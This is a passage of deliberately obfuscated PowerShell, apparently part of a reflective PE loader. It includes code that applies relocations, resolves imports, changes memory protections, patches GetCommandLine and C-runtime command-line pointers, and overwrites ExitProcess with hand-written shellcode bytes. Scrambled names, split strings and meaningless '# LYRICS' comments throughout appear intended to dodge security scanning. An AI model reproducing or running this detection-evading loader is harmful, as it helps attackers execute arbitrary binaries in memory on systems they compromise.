# LYRICS622
                $VAR0194  =  $VAR0192."CoNsT`1`44"
# LYRICS623
                if ($VAR0192."CONS`T1`45" -eq 0 ) {
# LYRICS624
                    $VAR0194   =  0
                }
# LYRICS625
                if ( $VAR0194 -gt $VAR0192."CON`sT`143") {
# LYRICS626
                    $VAR0194   =  $VAR0192."C`oNst143"
                }
# LYRICS627
                if ($VAR0194 -gt 0) {
                      &  (  "{0}{1}{2}"-f'FUN0','0','9'  ) -VAR0125 ( "{1}{3}{4}{0}{2}" -f 'l','FUN020:','Copy',':Marsh','a') -VAR0126 $VAR0126 -VAR0127 $VAR0193 -Size $VAR0194 |    &( "{0}{1}{2}"-f'Ou','t-Nul','l'  )
# LYRICS628
                    $VAR099::"C`oPY"( $VAR001, [Int32]$VAR0192."cON`ST145", $VAR0193, $VAR0194 )
# LYRICS629
                }
# LYRICS630
# LYRICS631
                if ( $VAR0192."c`ONST144" -lt $VAR0192."COnST`143"  ) {
                    $VAR0195 =  $VAR0192."c`oNST1`43" - $VAR0194
# LYRICS632
                    [IntPtr]$VAR0127 =   [IntPtr](  & ("{1}{0}" -f '005','FUN' ) (  [Int64]$VAR0193 ) ( [Int64]$VAR0194  ))
# LYRICS633
                      &("{0}{1}"-f'F','UN009') -VAR0125 (  "{2}{0}{3}{1}"-f'N','N034','FU','020::FU'  ) -VAR0126 $VAR0126 -VAR0127 $VAR0127 -Size $VAR0195 |    &( "{0}{2}{1}"-f 'O','ll','ut-Nu'  )
# LYRICS634
                    $VAR0042."fu`N0`34"."iN`VO`Ke"($VAR0127, 0, [IntPtr]$VAR0195 )  |  &  (  "{1}{2}{0}"-f 'Null','Out','-' )
                }
            }
        }
# LYRICS635
# LYRICS636
        Function F`UN021 {
# LYRICS637
            Param( 
                [Parameter( posITIon  =   0, MandAtoRy =   $true )]
                [System.Object]
                $VAR0126,
# LYRICS638
                [Parameter(  pOsItIon   = 1, mandATorY   = $true )]
                [Int64]
                $VAR0196,
# LYRICS639
                [Parameter(  POsItION   =  2, mANdATory  =   $true  )]
                [System.Object]
                $VAR0041,
# LYRICS640
                [Parameter(  pOsItion   = 3, MandaTOrY =  $true  )]
                [System.Object]
                $VAR010
             )
# LYRICS641
            [Int64]$VAR0197   =  0
# LYRICS642
            $VAR0198   = $true 
# LYRICS643
            [UInt32]$VAR0199   =  $VAR099::"s`IzEOf"([Type]$VAR010."cOns`T1`50")
# LYRICS644
# LYRICS645
            if (  ( $VAR0196 -eq [Int64]$VAR0126."c`ONst039"  ) `
                    -or ($VAR0126."cON`s`T031"."Cons`T1`22"."cO`NSt112"."SI`ZE" -eq 0 )) {
# LYRICS646
                return
            }
# LYRICS647
# LYRICS648
            elseif ((&( "{1}{0}"-f '06','FUN0') ( $VAR0196  ) ( $VAR0126."CONst039")  ) -eq $true  ) {
# LYRICS649
                $VAR0197  =   & ( "{1}{0}"-f'UN004','F' ) ( $VAR0196 ) ($VAR0126."CO`NsT039" )
                $VAR0198 =   $false
            }
            elseif ((   &(  "{2}{1}{0}"-f 'N006','U','F'  ) ( $VAR0126."COn`st039") ( $VAR0196  ) ) -eq $true ) {
# LYRICS650
                $VAR0197 =   &  ("{1}{0}"-f '04','FUN0' ) ($VAR0126."COnst0`39" ) (  $VAR0196  )
            }
# LYRICS651
# LYRICS652
            [IntPtr]$VAR0200   =   [IntPtr](    &  ("{1}{0}"-f 'UN005','F' ) ( [Int64]$VAR0126."v`AR0263" ) ( [Int64]$VAR0126."CO`NsT0`31"."cON`st122"."CoNsT`1`12"."ConsT0`74" ))
# LYRICS653
            while (  $true  ) {
# LYRICS654
                $VAR0201   =  $VAR099::"P`TrTO`ST`RUcTure"(  $VAR0200, [Type]$VAR010."co`N`ST150" )
# LYRICS655
                if (  $VAR0201."c`O`NSt151" -eq 0  ) {
                    break
                }
# LYRICS656
                [IntPtr]$VAR0202   = [IntPtr](   &(  "{1}{0}" -f'005','FUN' ) (  [Int64]$VAR0126."va`R0263") ([Int64]$VAR0201."cONSt074" )  )
# LYRICS657
                $VAR0203 =   ( $VAR0201."ConSt`151" - $VAR0199 ) / 2
# LYRICS658
# LYRICS659
                for ($i  =  0;  $i -lt $VAR0203;  $i++  ) {
# LYRICS660
                    $VAR0204   =   [IntPtr](&  ( "{1}{0}"-f '05','FUN0' ) ( [IntPtr]$VAR0200  ) ([Int64]$VAR0199  + ( 2 * $i  )  ) )
# LYRICS661
                    [UInt16]$VAR0205   =   $VAR099::"pT`RtO`struCT`UrE"( $VAR0204, [Type][UInt16])
# LYRICS662
# LYRICS663
                    [UInt16]$VAR0206 =  $VAR0205 -band 0x0FFF
# LYRICS664
                    [UInt16]$VAR0207   =   $VAR0205 -band 0xF000
                    for ($j =  0  ;  $j -lt 12 ; $j++  ) {
                        $VAR0207 =   (    &  ("{1}{2}{4}{0}{3}" -f'dit','Ge','T-C','EM','HIl'  )  ("VARiabL"  + "E:u" + "QJ" )  ).ValuE::(  "{1}{0}" -f 'or','Flo' ).Invoke(  $VAR0207 / 2  )
                    }
# LYRICS665
# LYRICS666
# LYRICS667
# LYRICS668
                    if ((  $VAR0207 -eq $VAR0041."c`oNst0`13" ) `
                            -or (  $VAR0207 -eq $VAR0041."CO`NST014"  )) {
# LYRICS669
# LYRICS670
                        [IntPtr]$VAR0208   = [IntPtr]( & ( "{1}{2}{0}" -f '005','F','UN' ) (  [Int64]$VAR0202  ) ( [Int64]$VAR0206) )
# LYRICS671
                        [IntPtr]$VAR0209 = $VAR099::"pTR`TostrUc`Tu`RE"($VAR0208, [Type][IntPtr]  )
# LYRICS672
                        if ( $VAR0198 -eq $true ) {
# LYRICS673
                            [IntPtr]$VAR0209  = [IntPtr]( &  ( "{1}{0}"-f'05','FUN0'  ) ( [Int64]$VAR0209) ($VAR0197  ) )
                        }
                        else {
# LYRICS674
                            [IntPtr]$VAR0209  =  [IntPtr](  &  ( "{1}{0}{2}" -f'UN00','F','4') ([Int64]$VAR0209) (  $VAR0197  ))
                        }
# LYRICS675
                        $VAR099::( "{1}{0}{3}{2}" -f'truct','S','eToPtr','ur').Invoke($VAR0209, $VAR0208, $false) |  & ("{1}{0}{2}"-f 't-','Ou','Null' )
                    }
                    elseif ($VAR0207 -ne $VAR0041."COn`s`T012"  ) {
# LYRICS676
                        Throw (  'ER'  + 'R'  +'OR' +  '25: '  + "$VAR0207, "+ 'ERRO'+ 'R2'  +  '6: ' +"$VAR0205"  )
                    }
                }
# LYRICS677
                $VAR0200 =   [IntPtr]( &  (  "{1}{0}" -f '05','FUN0') (  [Int64]$VAR0200  ) (  [Int64]$VAR0201."c`oNS`T151"  )  )
            }
        }
# LYRICS678
# LYRICS679
        Function fUN022 {
# LYRICS680
            Param( 
                [Parameter(posITiON  =   0, mAndatORY =   $true  )]
                [System.Object]
                $VAR0126,
# LYRICS681
                [Parameter(poSItiOn   = 1, mANdaTORY =  $true )]
                [System.Object]
                $VAR0042,
# LYRICS682
                [Parameter(  pOSITION  =   2, mAndATorY =   $true)]
                [System.Object]
                $VAR010,
# LYRICS683
                [Parameter( posItiON  =   3, MANDaTory   =  $true )]
                [System.Object]
                $VAR0041,
# LYRICS684
                [Parameter(  POsItIOn  =   4, manDatORY   =   $false)]
                [IntPtr]
                $VAR0161
            )
# LYRICS685
            $VAR0210   = $false
            if ( $VAR0126."VA`R0263" -ne $VAR0126."CONs`T0`39" ) {
# LYRICS686
                $VAR0210  = $true
            }
# LYRICS687
            if ( $VAR0126."coN`S`T031"."co`Nst122"."C`oNS`T108"."S`izE" -gt 0  ) {
# LYRICS688
                [IntPtr]$VAR0211   =    & ("{0}{2}{1}"-f 'FU','05','N0' ) ([Int64]$VAR0126."VaR0`263" ) (  [Int64]$VAR0126."Con`St031"."co`NsT1`22"."co`NsT`108"."cO`N`sT074"  )
# LYRICS689
                while ($true  ) {
# LYRICS690
                    $VAR0212   =  $VAR099::"PTRTosT`RuCTu`Re"(  $VAR0211, [Type]$VAR010."c`onST152"  )
# LYRICS691
# LYRICS692
                    if ( $VAR0212."CONST0`67" -eq 0 `
                            -and $VAR0212."co`NST`154" -eq 0 `
                            -and $VAR0212."c`o`Nst153" -eq 0 `
                            -and $VAR0212."na`Me" -eq 0 `
                            -and $VAR0212."cO`Ns`T071" -eq 0) {
# LYRICS693
                        break
                    }
# LYRICS694
                    $VAR0213 =   $VAR095::"z`ERO"
# LYRICS695
                    $VAR0162 = (  &  ( "{2}{0}{1}" -f'N0','05','FU'  ) ([Int64]$VAR0126."VaR0263") ([Int64]$VAR0212."Na`Me" ))
                    $VAR0164 = $VAR099::("{0}{1}{2}{3}" -f 'PtrT','oS','tringAn','si' ).Invoke( $VAR0162  )
# LYRICS696
# LYRICS697
                    if ($VAR0210 -eq $true ) {
# LYRICS698
                        $VAR0213   =   &  ( "{2}{0}{1}"-f 'U','N018','F'  ) -VAR0161 $VAR0161 -VAR0162 $VAR0162
                    }
                    else {
                        $VAR0213 =   $VAR0042."fUn0`35"."INVO`ke"( $VAR0164 )
# LYRICS699
                    }
# LYRICS700
                    if (  ($VAR0213 -eq $null ) -or (  $VAR0213 -eq $VAR095::"Ze`RO" )  ) {
# LYRICS701
                        throw ( 'ER'  +'R' + 'OR28: '+  "$VAR0164")
                    }
# LYRICS702
# LYRICS703
                    [IntPtr]$VAR0214  =  &( "{0}{1}"-f 'FUN00','5'  ) ( $VAR0126."vaR0263" ) (  $VAR0212."COnst`154" )
# LYRICS704
                    [IntPtr]$VAR0215  =     &(  "{2}{1}{0}" -f '05','N0','FU'  ) ($VAR0126."VAR02`63" ) ( $VAR0212."C`Onst067" ) 
# LYRICS705
                    [IntPtr]$VAR0216  =   $VAR099::"P`TRt`O`sTRUCtURe"( $VAR0215, [Type][IntPtr])
# LYRICS706
                    while ($VAR0216 -ne $VAR095::"Z`ErO") {
# LYRICS707
                        $VAR0185 =   $false
                        [IntPtr]$VAR0217  =  $VAR095::"ze`Ro"
# LYRICS708
# LYRICS709
# LYRICS710
                        [IntPtr]$VAR0218  =   $VAR095::"zE`Ro"
# LYRICS711
                        if ( $VAR099::"SiZE`OF"(  [Type][IntPtr]  ) -eq 4 -and [Int32]$VAR0216 -lt 0) {
                            [IntPtr]$VAR0217  = [IntPtr]$VAR0216 -band 0xffff 
                            $VAR0185   =   $true
# LYRICS712
                        }
                        elseif (  $VAR099::"SizE`of"(  [Type][IntPtr]) -eq 8 -and [Int64]$VAR0216 -lt 0  ) {
# LYRICS713
                            [IntPtr]$VAR0217   =  [Int64]$VAR0216 -band 0xffff 
                            $VAR0185  = $true
                        }
                        else {
                            [IntPtr]$VAR0219  =   & ("{1}{0}{2}" -f 'N0','FU','05'  ) ($VAR0126."vAR02`63"  ) ($VAR0216  )
# LYRICS714
                            $VAR0219   =  &  (  "{1}{0}{2}"-f 'N0','FU','05'  ) $VAR0219 (  $VAR099::"s`izeof"([Type][UInt16]  ))
                            $VAR0220  =  $VAR099::("{4}{3}{0}{2}{1}"-f 'i','gAnsi','n','rToStr','Pt').Invoke( $VAR0219  )
# LYRICS715
                            $VAR0217  =  $VAR099::( "{1}{4}{3}{5}{0}{2}"-f 'HGlo','S','balAnsi','ringT','t','o').Invoke( $VAR0220)
                        }
# LYRICS716
                        if ($VAR0210 -eq $true) {
# LYRICS717
                            [IntPtr]$VAR0218   =   &  ( "{1}{0}"-f '9','FUN01' ) -VAR0161 $VAR0161 -VAR0183 $VAR0213 -VAR0184 $VAR0217 -VAR0185 $VAR0185
                        }
                        else {
                            [IntPtr]$VAR0218  =  $VAR0042."f`Un037"."iNV`OKE"( $VAR0213, $VAR0217)
                        }
# LYRICS718
                        if (  $VAR0218 -eq $null -or $VAR0218 -eq $VAR095::"ZE`RO" ) {
# LYRICS719
                            if ( $VAR0185) {
                                Throw ('ERROR3' +'0'  +  ': ' +  "$VAR0217 " +  "$VAR0164")
                            }
                            else {
                                Throw (  'E'+  'RROR3' +  '1'+ ': '  +"$VAR0220 " + "$VAR0164"  )
                            }
                        }
# LYRICS720
                        $VAR099::(  "{3}{0}{1}{2}{4}" -f'uctur','e','ToPt','Str','r'  ).Invoke($VAR0218, $VAR0214, $false )
# LYRICS721
                        $VAR0214 =   &("{0}{2}{1}"-f 'F','N005','U') ([Int64]$VAR0214  ) ($VAR099::"si`zEoF"( [Type][IntPtr])  )
# LYRICS722
                        [IntPtr]$VAR0215   =   & ( "{1}{0}" -f '005','FUN') ([Int64]$VAR0215) (  $VAR099::"S`i`zeof"([Type][IntPtr]  ) )
# LYRICS723
                        [IntPtr]$VAR0216   =  $VAR099::"pTR`TO`s`TRUcturE"($VAR0215, [Type][IntPtr] )
# LYRICS724
# LYRICS725
# LYRICS726
                        if ((-not $VAR0185 ) -and ( $VAR0217 -ne $VAR095::"z`eRo" ) ) {
# LYRICS727
                            $VAR099::(  "{1}{0}{2}" -f 'Gl','FreeH','obal'  ).Invoke( $VAR0217  )
                            $VAR0217  = $VAR095::"Z`erO"
                        }
                    }
# LYRICS728
                    $VAR0211 =   & ( "{0}{1}"-f'FUN00','5'  ) ($VAR0211) ( $VAR099::"SiZE`oF"(  [Type]$VAR010."cons`T1`52" ))
                }
            }
        }
# LYRICS729
        Function fu`N023 {
# LYRICS730
            Param( 
                [Parameter(  POsiTIoN   =   0, MAnDaTORy  =  $true  )]
                [UInt32]
                $VAR0221
             )
# LYRICS731
            $VAR0222 = 0x0
            if ( ($VAR0221 -band $VAR0041."cONsT0`16"  ) -gt 0) {
# LYRICS732
                if ( (  $VAR0221 -band $VAR0041."Co`NsT017") -gt 0 ) {
# LYRICS733
                    if (  (  $VAR0221 -band $VAR0041."CO`Nst018" ) -gt 0) {
                        $VAR0222  =   $VAR0041."C`Onst008"
                    }
                    else {
                        $VAR0222  =  $VAR0041."coN`St009"
                    }
                }
                else {
                    if ( ($VAR0221 -band $VAR0041."CoN`S`T018"  ) -gt 0) {
# LYRICS734
                        $VAR0222   =   $VAR0041."CoNSt0`10"
                    }
                    else {
                        $VAR0222  = $VAR0041."ConS`T007"
                    }
                }
            }
            else {
                if (  ($VAR0221 -band $VAR0041."COn`sT017") -gt 0  ) {
                    if (  (  $VAR0221 -band $VAR0041."coNS`T018"  ) -gt 0  ) {
# LYRICS735
                        $VAR0222  =   $VAR0041."conST005"
                    }
                    else {
                        $VAR0222  =  $VAR0041."cON`ST004"
                    }
                }
                else {
                    if (  (  $VAR0221 -band $VAR0041."CoNst018") -gt 0) {
# LYRICS736
                        $VAR0222   =   $VAR0041."COn`sT006"
                    }
                    else {
                        $VAR0222  = $VAR0041."cONs`T003"
# LYRICS737
                    }
                }
            }
# LYRICS738
            if (( $VAR0221 -band $VAR0041."co`NSt0`19" ) -gt 0) {
# LYRICS739
                $VAR0222   = $VAR0222 -bor $VAR0041."CO`NS`T011"
            }
# LYRICS740
            return $VAR0222
        }
# LYRICS741
        Function F`Un024 {
# LYRICS742
            Param(
                [Parameter(  PosiTiON   = 0, maNDAtORy   = $true)]
                [System.Object]
                $VAR0126,
# LYRICS743
                [Parameter( pOsiTioN  = 1, MandATORy  =  $true)]
                [System.Object]
                $VAR0042,
# LYRICS744
                [Parameter(  pOSItIOn =   2, ManDAToRY   =  $true)]
                [System.Object]
                $VAR0041,
# LYRICS745
                [Parameter( PosITion = 3, MAnDAtORy =  $true )]
                [System.Object]
                $VAR010
             )
# LYRICS746
# LYRICS747
            for (   $i  =  0;  $i -lt $VAR0126."cOn`St0`31"."c`onst1`21"."c`onsT072"; $i++) {
# LYRICS748
                [IntPtr]$VAR0160  =  [IntPtr](&( "{1}{0}"-f'UN005','F') ( [Int64]$VAR0126."coNST036" ) ($i * $VAR099::"Siz`E`Of"(  [Type]$VAR010."c`O`NST142"  )  ))
# LYRICS749
                $VAR0192 =  $VAR099::"Pt`RtOs`TrUcTU`RE"($VAR0160, [Type]$VAR010."cO`NsT1`42")
# LYRICS750
                [IntPtr]$VAR0223 =   &  ("{0}{1}{2}"-f'F','UN00','5' ) ($VAR0126."vAR0`263") (  $VAR0192."cOnS`T074")
# LYRICS751
                [UInt32]$VAR0224   = &(  "{2}{0}{1}" -f'UN0','23','F') $VAR0192."conST0`67"
                [UInt32]$VAR0225  =  $VAR0192."con`S`T143"
# LYRICS752
                [UInt32]$VAR0226  =  0
                & (  "{1}{2}{0}"-f'9','FUN0','0' ) -VAR0125 ("{4}{3}{1}{2}{0}" -f'040','F','UN','24::','FUN0' ) -VAR0126 $VAR0126 -VAR0127 $VAR0223 -Size $VAR0225 | & (  "{0}{2}{1}" -f 'Ou','l','t-Nul'  )
# LYRICS753
                $Success  = $VAR0042."fUN0`40"."I`N`VOKe"(  $VAR0223, $VAR0225, $VAR0224, [Ref]$VAR0226 )
                if (  $Success -eq $false  ) {
                    Throw ( "{0}{1}{2}" -f 'ERRO','R','32')
                }
            }
        }
# LYRICS754
# LYRICS755
# LYRICS756
        Function fUN0`25 {
# LYRICS757
            Param(
                [Parameter(pOSITiON  =  0, maNDatorY  =  $true)]
                [System.Object]
                $VAR0126,
# LYRICS758
                [Parameter(  POSItIOn   =  1, MANDAtOry  = $true)]
                [System.Object]
                $VAR0042,
# LYRICS759
                [Parameter(POsiTIon  =   2, mAnDAToRY  =  $true )]
                [System.Object]
                $VAR0041,
# LYRICS760
                [Parameter( POSITion   = 3, mAnDATOrY   =  $true)]
                [String]
                $VAR0227,
# LYRICS761
                [Parameter(  poSition   =   4, ManDaToRY   = $true )]
                [IntPtr]
                $VAR0228
             )
# LYRICS762
# LYRICS763
            $VAR0229 =  @(  )
# LYRICS764
            $VAR0163  =  $VAR099::"S`i`zeOF"([Type][IntPtr] )
# LYRICS765
            [UInt32]$VAR0226   =  0
# LYRICS766
            [IntPtr]$VAR0168 = $VAR0042."F`Un041"."INvO`kE"($VAR0302  )
            if ( $VAR0168 -eq $VAR095::"Z`ErO") {
                throw ("{1}{0}{2}" -f'R','ER','OR33')
            }
# LYRICS767
            [IntPtr]$VAR0230  = $VAR0042."fUn0`41"."i`NvOKe"( ("{2}{0}{4}{1}{3}"-f 'l','ase.d','Kerne','ll','B' ))
# LYRICS768
            if (  $VAR0230 -eq $VAR095::"z`ERO") {
                throw (  "{0}{1}"-f'ERR','OR34'  )
            }
# LYRICS769
# LYRICS770
# LYRICS771
# LYRICS772
            $VAR0231   =  $VAR099::(  "{0}{1}{2}{3}" -f 'Stri','ngToHGlo','bal','Uni' ).Invoke($VAR0227  )
# LYRICS773
            $VAR0232 =  $VAR099::( "{0}{4}{5}{1}{2}{3}" -f 'Strin','lob','alAn','si','g','ToHG' ).Invoke( $VAR0227 )
# LYRICS774
            [IntPtr]$VAR0233   =   $VAR0042."FUn0`36"."in`VoKE"($VAR0230, ( "{1}{2}{4}{3}{0}" -f'ineA','Ge','tCo','andL','mm' )  )
# LYRICS775
            [IntPtr]$VAR0234  = $VAR0042."f`UN036"."in`VOkE"($VAR0230, (  "{0}{3}{2}{4}{1}" -f'Ge','ndLineW','mm','tCo','a'  ) )
# LYRICS776
            if ( $VAR0233 -eq $VAR095::"Ze`RO" -or $VAR0234 -eq $VAR095::"ZE`RO") {
# LYRICS777
                throw "ERROR36: $(FUN008 $VAR0233). ERROR37: $(FUN008 $VAR0234) "
            }
# LYRICS778
# LYRICS779
            [Byte[]]$VAR0235   = @()
# LYRICS780
            if (  $VAR0163 -eq 8 ) {
# LYRICS781
                $VAR0235 += 0x48 
            }
            $VAR0235 += 0xb8
# LYRICS782
            [Byte[]]$VAR0236  =  195
            $VAR0237  = $VAR0235."L`en`gTh"   +   $VAR0163  + $VAR0236."LENG`Th"
# LYRICS783
# LYRICS784
            $VAR0238 =   $VAR099::( "{1}{0}{2}{3}"-f 'Gl','AllocH','ob','al' ).Invoke($VAR0237  )
# LYRICS785
            $VAR0239   = $VAR099::(  "{1}{0}{2}"-f 'Globa','AllocH','l'  ).Invoke( $VAR0237)
            $VAR0042."Fu`N033"."i`NVoKE"( $VAR0238, $VAR0233, [UInt64]$VAR0237)  |    &  ("{1}{0}" -f'ut-Null','O')
            $VAR0042."fU`N0`33"."i`NvO`Ke"(  $VAR0239, $VAR0234, [UInt64]$VAR0237 )  |    & ( "{0}{1}"-f'O','ut-Null')
# LYRICS786
            $VAR0229 += , ($VAR0233, $VAR0238, $VAR0237  )
# LYRICS787
            $VAR0229 += , ( $VAR0234, $VAR0239, $VAR0237)
# LYRICS788
# LYRICS789
# LYRICS790
            [UInt32]$VAR0226 =   0
            $Success = $VAR0042."F`Un040"."Inv`okE"( $VAR0233, [UInt32]$VAR0237, [UInt32]($VAR0041."ConST008"), [Ref]$VAR0226)
# LYRICS791
            if ( $Success = $false  ) {
                throw ("{0}{1}{2}" -f'ERRO','R3','9'  )
            }
# LYRICS792
            $VAR0240   = $VAR0233
              & (  "{0}{1}"-f 'FUN0','10') -Bytes $VAR0235 -VAR0129 $VAR0240
# LYRICS793
            $VAR0240   =  &  ("{0}{2}{1}" -f'FUN','5','00'  ) $VAR0240 ( $VAR0235."L`eNGth")
            $VAR099::( "{3}{1}{2}{0}"-f 'r','oP','t','StructureT').Invoke( $VAR0232, $VAR0240, $false )
# LYRICS794
            $VAR0240  =  & (  "{0}{1}"-f 'FUN','005'  ) $VAR0240 $VAR0163
# LYRICS795
              & (  "{0}{1}" -f'FU','N010'  ) -Bytes $VAR0236 -VAR0129 $VAR0240
# LYRICS796
            $VAR0042."fUn040"."In`VoKE"( $VAR0233, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226 )  |     & ("{1}{0}"-f'Null','Out-'  )
# LYRICS797
# LYRICS798
# LYRICS799
            [UInt32]$VAR0226   = 0
            $Success = $VAR0042."fU`N040"."InV`oKe"($VAR0234, [UInt32]$VAR0237, [UInt32]( $VAR0041."c`oN`sT008"), [Ref]$VAR0226  )
# LYRICS800
            if ($Success   =  $false  ) {
                throw ( "{0}{1}{2}"-f'ER','RO','R40' )
            }
# LYRICS801
            $VAR0234Temp  =  $VAR0234
# LYRICS802
            & ("{0}{1}" -f 'FUN','010' ) -Bytes $VAR0235 -VAR0129 $VAR0234Temp
            $VAR0234Temp =   &  ("{0}{1}"-f'F','UN005'  ) $VAR0234Temp ($VAR0235."l`Ength" )
# LYRICS803
            $VAR099::(  "{2}{3}{1}{0}"-f 'tr','P','St','ructureTo' ).Invoke($VAR0231, $VAR0234Temp, $false  )
# LYRICS804
            $VAR0234Temp  =  & ( "{0}{1}{2}"-f'FUN','00','5') $VAR0234Temp $VAR0163
# LYRICS805
             &( "{0}{2}{1}" -f 'F','0','UN01'  ) -Bytes $VAR0236 -VAR0129 $VAR0234Temp
# LYRICS806
            $VAR0042."Fun0`40"."Inv`OKE"( $VAR0234, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226 ) |  & (  "{0}{1}"-f 'Out-Nul','l'  )
# LYRICS807
# LYRICS808
# LYRICS809
# LYRICS810
# LYRICS811
# LYRICS812
# LYRICS813
            $VAR0241   =  @((  "{0}{1}{2}{3}" -f 'm','sv','cr70d','.dll' ), (  "{0}{1}{2}" -f'msvcr71','d','.dll'  ), ("{0}{3}{1}{2}"-f'msvcr80','.','dll','d'), ("{2}{0}{1}{3}" -f'svcr90','d.dl','m','l'  ), ("{3}{0}{2}{1}" -f 'vc','ll','r100d.d','ms' ), ( "{3}{2}{1}{0}" -f'dll','10d.','r1','msvc' ), ( "{0}{3}{2}{1}" -f'ms','l','.dl','vcr70') `
                    , (  "{2}{1}{0}"-f'dll','vcr71.','ms' ), ("{0}{2}{3}{1}" -f'm','ll','svc','r80.d' ), ("{1}{2}{0}"-f'.dll','msv','cr90'  ), (  "{2}{0}{1}" -f'c','r100.dll','msv' ), (  "{0}{2}{1}" -f 'msvc','dll','r110.' ), (  "{3}{1}{2}{0}"-f '0.dll','svc','r12','m'  ), ( "{0}{2}{1}" -f'ms','rt.dll','vc' ) )
# LYRICS814
            foreach ($VAR0242 in $VAR0241) {
# LYRICS815
                [IntPtr]$VAR0243 =   $VAR0042."fU`N0`41"."I`NVoke"(  $VAR0242 )
                if (  $VAR0243 -ne $VAR095::"Z`ERo") {
# LYRICS816
                    [IntPtr]$VAR0244   = $VAR0042."fun0`36"."iNV`oKE"($VAR0243, ( "{0}{1}" -f'_wcm','dln') )
# LYRICS817
                    [IntPtr]$VAR0245 =  $VAR0042."Fun036"."i`Nvo`ke"($VAR0243, ("{0}{2}{1}"-f '_a','n','cmdl' )  )
                    if (  $VAR0244 -eq $VAR095::"Z`ErO" -or $VAR0245 -eq $VAR095::"z`eRo"  ) {
# LYRICS818
                        ( "{0}{2}{1}" -f 'E','ROR41','R'  )
                    }
# LYRICS819
                    $VAR0246   =  $VAR099::("{0}{2}{1}{3}"-f'Strin','l','gToHG','obalAnsi').Invoke(  $VAR0227 )
# LYRICS820
                    $VAR0247   =   $VAR099::(  "{4}{1}{2}{3}{0}"-f'ToHGlobalUni','t','r','ing','S').Invoke( $VAR0227)
# LYRICS821
# LYRICS822
# LYRICS823
                    $VAR0248  = $VAR099::"PtR`T`ostRu`CTUrE"( $VAR0245, [Type][IntPtr] )
# LYRICS824
                    $VAR0249   = $VAR099::"p`Trt`OstRuc`TU`RE"($VAR0244, [Type][IntPtr]  )
                    $VAR0250 = $VAR099::( "{2}{1}{0}"-f 'l','llocHGloba','A'  ).Invoke(  $VAR0163  )
                    $VAR0251   = $VAR099::( "{3}{0}{1}{2}"-f'lob','a','l','AllocHG').Invoke($VAR0163 )
# LYRICS825
                    $VAR099::( "{0}{3}{1}{2}"-f'S','ctur','eToPtr','tru'  ).Invoke( $VAR0248, $VAR0250, $false  )
# LYRICS826
                    $VAR099::( "{0}{3}{1}{2}"-f'Stru','ureToP','tr','ct').Invoke(  $VAR0249, $VAR0251, $false  )
                    $VAR0229 += , (  $VAR0245, $VAR0250, $VAR0163)
# LYRICS827
                    $VAR0229 += , (  $VAR0244, $VAR0251, $VAR0163 )
# LYRICS828
                    $Success =   $VAR0042."FU`N040"."iN`VOke"(  $VAR0245, [UInt32]$VAR0163, [UInt32](  $VAR0041."CO`NsT008"  ), [Ref]$VAR0226 )
                    if ( $Success   =   $false) {
                        throw ("{1}{2}{0}"-f'2','ER','ROR4'  )
                    }
                    $VAR099::("{1}{0}{2}{3}{4}" -f 'uc','Str','t','u','reToPtr' ).Invoke(  $VAR0246, $VAR0245, $false )
# LYRICS829
                    $VAR0042."fU`N040"."Inv`OKe"($VAR0245, [UInt32]$VAR0163, [UInt32]( $VAR0226), [Ref]$VAR0226  ) |   & ("{0}{1}" -f'Out-Nul','l' )
# LYRICS830
# LYRICS831
                    $Success   = $VAR0042."f`Un0`40"."iNV`oke"(  $VAR0244, [UInt32]$VAR0163, [UInt32](  $VAR0041."c`onst008"), [Ref]$VAR0226 )
                    if ($Success   =   $false) {
# LYRICS832
                        throw (  "{1}{2}{0}" -f'43','ERR','OR')
                    }
                    $VAR099::("{0}{2}{1}{3}" -f'S','cture','tru','ToPtr').Invoke( $VAR0247, $VAR0244, $false)
# LYRICS833
                    $VAR0042."fun040"."I`NVOKe"($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0226 ), [Ref]$VAR0226) |    &( "{2}{0}{1}"-f'-N','ull','Out' )
                }
            }
# LYRICS834
# LYRICS835
# LYRICS836
# LYRICS837
# LYRICS838
            $VAR0229  =  @( )
# LYRICS839
            $VAR0252   = @() 
# LYRICS840
# LYRICS841
            [IntPtr]$VAR0253  =  $VAR0042."Fu`N041"."iNv`O`KE"(( "{2}{1}{0}" -f 'oree.dll','c','ms')  )
# LYRICS842
            if (  $VAR0253 -eq $VAR095::"Ze`Ro"  ) {
# LYRICS843
                throw (  "{0}{1}" -f 'E','RROR44')
            }
            [IntPtr]$VAR0254 = $VAR0042."Fu`N036"."Inv`OKe"( $VAR0253, ( "{1}{2}{0}{3}" -f 'Proce','C','orExit','ss' ))
# LYRICS844
            if ( $VAR0254 -eq $VAR095::"z`ErO") {
                Throw (  "{0}{1}" -f'ERROR','45')
# LYRICS845
            }
            $VAR0252 += $VAR0254
# LYRICS846
# LYRICS847
            [IntPtr]$VAR0255  = $VAR0042."FU`N0`36"."INvO`KE"($VAR0168, ("{2}{1}{3}{0}" -f'rocess','t','Exi','P' ))
# LYRICS848
            if ( $VAR0255 -eq $VAR095::"Z`ERo") {
                Throw (  "{0}{1}"-f'E','RROR46' )
# LYRICS849
            }
            $VAR0252 += $VAR0255
# LYRICS850
            [UInt32]$VAR0226 = 0
            foreach ( $VAR0256 in $VAR0252 ) {
# LYRICS851
                $VAR0257  = $VAR0256
# LYRICS852
# LYRICS853
                [Byte[]]$VAR0235   = 187
# LYRICS854
                [Byte[]]$VAR0236   = 198,3,1,131,236,32,131,228,192,187
# LYRICS855
                if (  $VAR0163 -eq 8) {
                    [Byte[]]$VAR0235 =  72,187
# LYRICS856
                    [Byte[]]$VAR0236 =  198,3,1,72,131,236,32,102,131,228,192,72,187
                }
                [Byte[]]$VAR0258 = 255,211
# LYRICS857
                $VAR0237   =   $VAR0235."l`e`NgTh" + $VAR0163 +  $VAR0236."lEn`GTh" +   $VAR0163 + $VAR0258."LEn`gTh"
# LYRICS858
                [IntPtr]$VAR0259   =  $VAR0042."fUn036"."inVO`kE"($VAR0168, ("{0}{3}{1}{2}"-f 'E','t','Thread','xi' )  )
# LYRICS859
                if (  $VAR0259 -eq $VAR095::"z`ero" ) {
                    Throw ( "{2}{1}{0}" -f '47','RROR','E' )
                }
# LYRICS860
                $Success   = $VAR0042."F`UN040"."iNvo`Ke"(  $VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0041."CONst008", [Ref]$VAR0226)
# LYRICS861
                if (  $Success -eq $false ) {
                    Throw (  "{2}{0}{1}" -f 'R','OR48','ER' )
                }
# LYRICS862
# LYRICS863
